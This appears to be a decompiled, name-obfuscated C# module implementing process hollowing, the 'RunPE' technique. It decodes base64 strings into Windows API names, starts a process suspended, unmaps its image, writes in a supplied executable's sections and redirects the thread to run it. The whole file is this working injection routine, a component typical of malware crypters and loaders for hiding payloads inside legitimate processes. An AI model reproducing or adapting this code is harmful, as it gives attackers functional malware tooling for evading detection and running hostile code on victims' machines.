using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class3
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate0(string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.Bool)] bool bool_0, int int_0, IntPtr intptr_2, string string_1, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, int int_0);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, int int_0, ref IntPtr intptr_3);

	public delegate IntPtr Delegate3(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate uint Delegate4(IntPtr intptr_0, IntPtr intptr_1);

	public delegate uint Delegate5(IntPtr intptr_0);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate6(IntPtr intptr_0, uint[] uint_0);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate7(IntPtr intptr_0, uint[] uint_0);

	internal sealed class Class4
	{
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	public static bool smethod_1(byte[] byte_0, string string_0)
	{
		Delegate0 @delegate = smethod_0<Delegate0>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
		Delegate6 delegate2 = smethod_0<Delegate6>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
		Delegate2 delegate3 = smethod_0<Delegate2>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
		Delegate3 delegate4 = smethod_0<Delegate3>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
		Delegate1 delegate5 = smethod_0<Delegate1>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
		Delegate7 delegate6 = smethod_0<Delegate7>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
		Delegate5 delegate7 = smethod_0<Delegate5>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
		Delegate4 delegate8 = smethod_0<Delegate4>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] byte_ = new byte[68];
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				if (@delegate(null, new StringBuilder(string_0), zero, zero, bool_0: false, 4, zero, null, byte_, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (delegate2(array[1], array2))
					{
						IntPtr intptr_ = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr intptr_2 = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr intptr_3 = IntPtr.Zero;
						if (delegate3(array[0], intptr_, ref intptr_2, (int)intPtr2, ref intptr_3) && unchecked((long)delegate8(array[0], intptr_2)) == 0L)
						{
							IntPtr intptr_6 = delegate4(intptr_1: new IntPtr(BitConverter.ToInt32(byte_0, num + 52)), intptr_2: new IntPtr(BitConverter.ToInt32(byte_0, num + 80)), intptr_0: array[0], int_0: 12288, int_1: 64);
							int num3 = intptr_6.ToInt32();
							int int_ = default(int);
							delegate5(array[0], intptr_6, byte_0, (uint)(int)intPtr, int_);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(byte_0, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(byte_0, array3[5], array4, 0, array4.Length);
								delegate5(intptr_1: new IntPtr(num3 + array3[3]), uint_0: (uint)(int)new IntPtr(array4.Length), intptr_0: array[0], byte_0: array4, int_0: int_);
							}
							delegate5(intptr_1: new IntPtr(unchecked((long)array2[41]) + 8L), uint_0: (uint)(int)new IntPtr(4), intptr_0: array[0], byte_0: BitConverter.GetBytes(intptr_6.ToInt32()), int_0: int_);
							array2[44] = (uint)(intptr_6.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
							delegate6(array[1], array2);
						}
					}
					delegate7(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
